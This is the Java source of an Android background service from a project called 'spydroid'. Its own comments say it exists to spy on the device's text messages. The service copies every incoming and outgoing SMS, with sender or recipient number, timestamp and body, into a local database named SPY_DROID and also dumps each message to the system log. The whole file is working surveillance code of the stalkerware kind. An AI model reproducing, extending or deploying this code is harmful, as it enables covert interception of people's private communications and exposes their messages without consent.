package com.innolabs.spydroid;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentValues;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;

/**
 * SMS Listener Service is a service used to SPY the SMS logs from the device. All INCOMING, OUTGOING SMS messages are logged and store to a database in this service.
 *
 * @see android.app.Service 
 *
 * @author Srikanth Rao
 *
 */
@SuppressLint("SimpleDateFormat")
public class SMSListeners extends Service {

	/** Static variable of type DataBase */
	static DataBase dataBase;

	/** Uri value for Incoming SMS which is to be parsed */
	Uri uriIncomingSMS = Uri.parse("content://sms/inbox");

	/** Uri value for Outgoing SMS which is to be parsed */
	Uri uriOutgoingSMS = Uri.parse("content://sms/sent");

	/** String value to store Incoming SMS database table name */
	String incomingSMSTable = "INCOMING_SMS";

	/** String value to store Outgoing SMS database table name */
	String outgoingSMSTable = "OUTGOING_SMS";

	/** String value to show the TAG for the activity in the LOG CAT */
	public static String SMS_TAG = "SPY DROID - SMS LISTENER SERVICE";

	/** Arraylist of String to store the Incoming SMS Phone Number */
	public static ArrayList<String> al_incoming_sms_from = new ArrayList<String>();

	/** Arraylist of String to store the Incoming SMS Date Time */
	public static ArrayList<String> al_incoming_sms_datetime = new ArrayList<String>();

	/** Arraylist of String to store the Incoming SMS Message Body */
	public static ArrayList<String> al_incoming_sms_body = new ArrayList<String>();

	/** Arraylist of String to store the Outgoing SMS Phone Number */
	public static ArrayList<String> al_outgoing_sms_to = new ArrayList<String>();

	/** Arraylist of String to store the Outgoing SMS Date Time */
	public static ArrayList<String> al_outgoing_sms_datetime = new ArrayList<String>();

	/** Arraylist of String to store the Outgoing SMS Message Body */
	public static ArrayList<String> al_outoing_sms_body = new ArrayList<String>();

	/** Method called when BindService is called from other instance
	 * 
	 * @param intent The Intent from which the method was called
	 * 
	 * @return null Noting is sent back to the bindService method
	 * 
	 * @see android.app.Service#onBind(Intent)
	 */	
	@Override
	public IBinder onBind(Intent intent) {

		return null;
	}

	/**
	 * Method that starts as soon as the SMS Listener service is started.
	 * 
	 * This method is used to log or spy or track all the Incoming, Outgoing sms from the device and save them to a database.
	 * 
	 * @see android.app.Service#onStartCommand(Intent, int, int)
	 * 
	 * @return The Intent, Flags and startId which was sent as arguments
	 */
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		Log.v(SMS_TAG, "SMS Listener Service Started");
		
		// Creating or Opening Database and getting Write Permission
		dataBase = new DataBase(this, "SPY_DROID");
		dataBase.getWritableDatabase();

		Log.v(SMS_TAG, "Opening or Creating Database and getting Write Permissions");
		
		// Creating or Opening Database tables
		dataBase.createTable(incomingSMSTable, getTableValues());
		dataBase.createTable(outgoingSMSTable, getTableValues());

		Log.v(SMS_TAG, "DataBase Tables Created");
		
		// Deleting old Database table row elements
		dataBase.deleteTableElements("INCOMING_SMS");
		dataBase.deleteTableElements("OUTGOING_SMS");

		Log.v(SMS_TAG, "Deleting Table rows from the Database");
		
		// Starting SMS Spy method
		spySMS();

		Log.v(SMS_TAG, "Started SPYING SMS");		
		
		// Closing Database
		dataBase.close();
		
		Log.v(SMS_TAG, "DataBase Closed");

		return super.onStartCommand(intent, flags, startId);
	}



	/**
	 * Spy SMS is a method in which the logs are tracked and stored to database
	 */
	private void spySMS() {

		/** INCOMING SMS LOGGER **/

		// Clearing the Arraylist to add new values
		al_incoming_sms_from.clear();
		al_incoming_sms_datetime.clear();
		al_incoming_sms_body.clear();

		// Creating Incoming SMS Cursor
		Cursor incoming_sms_cursor = getContentResolver().query(uriIncomingSMS, null, null, null, null);

		Log.v(SMS_TAG, "Getting Content Provider Permission and copying the Incoming SMS log to SMS Cursor");
		
		// Iterating the Incoming SMS Cursor to last		
		while (incoming_sms_cursor.moveToNext()) {

			// String and long variables to store SMS Number, Time, Message body
			long smsDateTime = incoming_sms_cursor.getLong(incoming_sms_cursor.getColumnIndex("date"));
			String smsNumber = incoming_sms_cursor.getString(incoming_sms_cursor.getColumnIndex("address"));
			String smsMessage = incoming_sms_cursor.getString(incoming_sms_cursor.getColumnIndex("body"));

			Log.v(SMS_TAG, "SMS Number : "+smsNumber + " SMS Message : "+smsMessage + "SMS Time : "+smsDateTime);
			
			// Setting Simple Date format
			SimpleDateFormat datePattern = new SimpleDateFormat ("yyyy-MM-dd HH:mm:ss");
			String dateString = datePattern.format(new Date(smsDateTime));

			String strDateTime[] = null;

			// Creating or Opening Incoming SMS Sub Cursor
			Cursor in_cursor = SMSListeners.dataBase.getValues(incomingSMSTable);

			Log.v(SMS_TAG, "Incoming Sub Cursor created for Database Table "+incomingSMSTable);
			
			// Getting the size of Incoming SMS Sub Cursor
			int count = in_cursor.getCount();

			// Checking if count of Incoming SMS Sub Cursor is not empty
			if(count > 0)
			{
				strDateTime = new String[count];

				// Moving Incoming SMS Sub Cursor to first
				in_cursor.moveToFirst();

				// Saving the Cursor values to Arraylist
				for (int counter = 0; counter < count; counter++) {
					strDateTime[counter] = in_cursor.getString(in_cursor.getColumnIndex("date"));
					al_incoming_sms_datetime.add(strDateTime[counter]);

					// Moving Cursor to next value
					in_cursor.moveToNext();
				}
			}

			// Checking if Arraylist contains the Date String value
			if(!al_incoming_sms_datetime.contains(dateString))
			{
				// Creating Content Value to store the Cursor values
				ContentValues incoming_content = new ContentValues();
				incoming_content.put("date", dateString);
				incoming_content.put("phonenum", smsNumber);
				incoming_content.put("message", smsMessage);

				// Inserting Content Values object to Incoming SMS Database Table
				dataBase.insertValues(incomingSMSTable, incoming_content);
				
				Log.v(SMS_TAG, "Data inserted into table "+incomingSMSTable);
			}

			// Closing Incoming SMS Sub Cursor
			in_cursor.close();	
			
			Log.v(SMS_TAG, "Incoming SMS Sub Cursor Closed");
		}

		// Closing Incoming SMS Cursor
		incoming_sms_cursor.close();
		
		Log.v(SMS_TAG, "Incoming SMS Cursor Closed");

		/** OUTGOING SMS LOGGER **/

		// Clearing the Arraylist to add new values
		al_outgoing_sms_to.clear();
		al_outgoing_sms_datetime.clear();
		al_outoing_sms_body.clear();

		// Creating Outgoing SMS Cursor
		Cursor outgoing_cursor = getContentResolver().query(uriOutgoingSMS, null, null, null, null);

		Log.v(SMS_TAG, "Getting Content Provider Permission and copying the Outgoing SMS log to SMS Cursor");
		
		// Iterating the Outgoing SMS Cursor to last
		while(outgoing_cursor.moveToNext())
		{
			// String and long variables to store SMS Number, Time, Message body
			long smsDateTime = outgoing_cursor.getLong(outgoing_cursor.getColumnIndex("date"));
			String smsNumber = outgoing_cursor.getString(outgoing_cursor.getColumnIndex("address"));
			String smsMessage = outgoing_cursor.getString(outgoing_cursor.getColumnIndex("body"));
			
			Log.v(SMS_TAG, "SMS Number : "+smsNumber + " SMS Message : "+smsMessage + "SMS Time : "+smsDateTime);

			// Setting Simple Date format
			SimpleDateFormat datePattern = new SimpleDateFormat ("yyyy-MM-dd HH:mm:ss");
			String dateString = datePattern.format(new Date(smsDateTime));

			String strDateTime[] = null;

			// Creating or Opening Outgoing SMS Sub Cursor
			Cursor out_cursor = SMSListeners.dataBase.getValues(outgoingSMSTable);
			
			Log.v(SMS_TAG, "Outgoing Sub Cursor created for Database Table "+outgoingSMSTable);

			// Getting the size of Outgoing SMS Sub Cursor
			int count = out_cursor.getCount();

			// Checking if count of Outgoing SMS Sub Cursor is not empty
			if(count > 0)
			{
				strDateTime = new String[count];

				// Moving Outgoing SMS Sub Cursor to first
				out_cursor.moveToFirst();

				// Saving the Cursor values to Arraylist
				for (int counter = 0; counter < count; counter++) {

					strDateTime[counter] = out_cursor.getString(out_cursor.getColumnIndex("date"));
					al_outgoing_sms_datetime.add(strDateTime[counter]);

					// Moving Cursor to next value
					out_cursor.moveToNext();		    		
				}
			}

			// Checking if Arraylist contains the Date String value
			if(!al_outgoing_sms_datetime.contains(dateString))
			{
				// Creating Content Value to store the Cursor values
				ContentValues outgoing_content = new ContentValues();
				outgoing_content.put("date", dateString);
				outgoing_content.put("phonenum", smsNumber);
				outgoing_content.put("message", smsMessage);

				// Inserting Content Values object to Outgoing SMS Database Table
				dataBase.insertValues(outgoingSMSTable, outgoing_content);
				
				Log.v(SMS_TAG, "Data inserted into table "+outgoingSMSTable);
			}

			// Closing Outgoing SMS Sub Cursor
			out_cursor.close();
			
			Log.v(SMS_TAG, "Outgoing SMS Sub Cursor Closed");
		}

		// Closing Outgoing SMS Cursor
		outgoing_cursor.close();
		
		Log.v(SMS_TAG, "Outgoing SMS Cursor Closed");

	}


	/**
	 * Get Table values is a method to return the Column names for the Database Table
	 *  
	 * @return String value : Column names of the Table
	 */
	private String getTableValues() {

		// Table Column Values
		String tablevalues = "SlNo INTEGER PRIMARY KEY,date TEXT,phonenum TEXT,message TEXT";

		return tablevalues;
	}



}
